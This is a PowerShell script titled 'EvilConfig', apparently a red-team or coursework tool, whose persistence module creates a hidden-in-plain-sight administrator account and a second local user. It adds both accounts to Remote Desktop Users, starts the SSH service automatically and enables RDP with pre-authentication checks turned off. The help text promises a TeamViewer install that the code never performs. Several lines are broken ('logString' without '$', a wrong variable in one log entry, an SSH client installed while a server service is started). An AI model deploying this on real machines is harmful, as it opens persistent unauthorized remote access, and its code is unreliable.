# AUTHOR: Anna Pratt
# VERSION: 1.0
# DATED: May 2025

# Parse arguments from the command line when the script is invoked
$arg0=$args[0]
$arg1=$args[1]

# This string will contain notes of every information performed by the script.
# The log will only be written to the configs.txt file if the --log flag is set.
$logString = ""

# Show help if the user uses the --help flag
if ($arg0 -eq "--help") {
    Write-Output "------------------------------------- EVILCONFIG -------------------------------------"
    Write-Output "This version of EvilConfig was made and tested on PowerShell version 5.1.26100.4061."
    Write-Output "You may encounter errors if using an older version of PowerShell."
    Write-Output ""
    Write-Output "OPTIONAL FLAGS:"
    Write-Output "--persist: Execute the persistence module, which performs the following:"
    Write-Output "      - Adds a local user (non-privileged) and adds a local user (privileged). You will be prompted for the user's passwords upon creation."
    Write-Output "      - Adds both of the new users to the local RDP allowed group."
    Write-Output "      - Installs SSH client for remote access."
    Write-Output "      - Installs TeamViewer for remote access."
    Write-Output "A stable internet connection is needed for the persistence module."
    Write-Output ""
    Write-Output "--log: Creates a configs.txt in the local directory with a list of configuration changes applied."
    Write-Output ""
    Write-Output "--------------------------------------------------------------------------------------"
}

# Execute the persistence module if the user adds the persistence flag
if ($arg0 -eq "--persist" -or $arg1 -eq "--persist" ) {
    $logString = $logString + "---------- PERSISTENCE ----------"

    #Gather credentials to create a non-privileged local account
    $localUserName  = Read-Host -MaskInput "Enter the local (non-privileged) username: "
    $localPass = Read-Host -AsSecureString "Enter the local (non-privileged) password: "
    New-LocalUser -Name $localUserName -Password $localPass
    $logString = logString + "Local (non-privileged) user added: " + $localUserName + "`n"

    #Gather credentials to create a privileged local account
    $adminUserName = Read-Host -MaskInput "Enter the local privileged username: "
    $adminPass = Read-Host -AsSecureString "Enter the local privileged password: "
    New-LocalUser -Name $adminUserName -Password $adminPass
    $logString = logString + "Local (privileged) user added: " + $adminUserName + "`n"

    # Add the privileged user to the local Administrators account
    Add-LocalGroupMember -Group "Administrators" -Member $adminUserName
    $logString = logString + "Local (privileged) user added to Administrators group: " + $localUserName + "`n"

    ## Add both new users to the RDP allowed group
    Add-LocalGroupMember -Group "Remote Desktop Users" -Member $localUserName
    Add-LocalGroupMember -Group "Remote Desktop Users" -Member $adminUserName
    $logString = logString + "Local users added to RDP group: " + $localUserName + "," + $adminUserName + "`n"

    # Install SSH client on the host
   Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0
    # Enable SSH service + modify the service to start automatically
   Start-Service sshd
   Set-Service -Name sshd -StartupType 'Automatic'
   $logString = logString + "SSH client installed, enabled to run on startup. `n"

   #Enable RDP on the system
   # Registry keys taken from this Reddit thread: https://www.reddit.com/r/PowerShell/comments/8qbxn5/enabling_rdp/
    Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0 #Value 0 means RDP is enabled
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "UserAuthentication" -Value 0 #Value 0 means RDP can be opened before authentication
    $logString = logString + "RDP enabled. `n"
    Write-Output "persistence module executed"
}

if ($arg0 -eq "--log" -or $arg1 -eq "--log" ) {
    Set-Content -Path "./configs.txt" -Value $logString
} 